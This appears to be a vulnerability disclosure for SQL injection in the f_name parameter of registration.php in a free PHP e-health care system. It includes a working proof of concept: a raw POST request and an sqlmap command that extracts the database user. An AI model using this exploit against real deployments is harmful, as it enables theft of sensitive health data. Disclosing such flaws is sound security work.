# E-Health Care System IN PHP registration.php has SQL injection vulnerability

## supplier
https://code-projects.org/e-health-care-system-in-php-css-js-and-mysql-free-download/
## Vulnerability file
registration.php
## describe
There are unrestricted SQL injection attacks in the health system. Controllable parameters: f_name. In registration.php, there is no restriction on adding f_name parameters to SQL statements. You can obtain sensitive information from the database.
## code analysis
The f_name parameters of the registration.php are not filtered and concatenated into the SQL statement for execution.

![image-20241103005850113](https://github.com/user-attachments/assets/8401cb81-8605-4124-a418-5008a0098aed)

![image-20241103005920138](sql14.assets/image-20241103005920138.png)



## POC

```
POST /Users/registration.php HTTP/1.1
Host: healthcare
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Origin: http://healthcare
Connection: close
Referer: http://healthcare/Users/registration.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

f_name=1*&l_name=1&email=1&contact=1&address=1&DOB=0001-11-02&gender=male&maritialstatus=married&pswd=123456789&submit=register
```

save as 1.txt

execute this command.

```
 python sqlmap.py -r 1.txt --current-user
```

Get the current_user:  root@localhost

![image-20241103010038902](https://github.com/user-attachments/assets/9ba1cffb-9a6b-4aee-b304-78fb4c2df336)

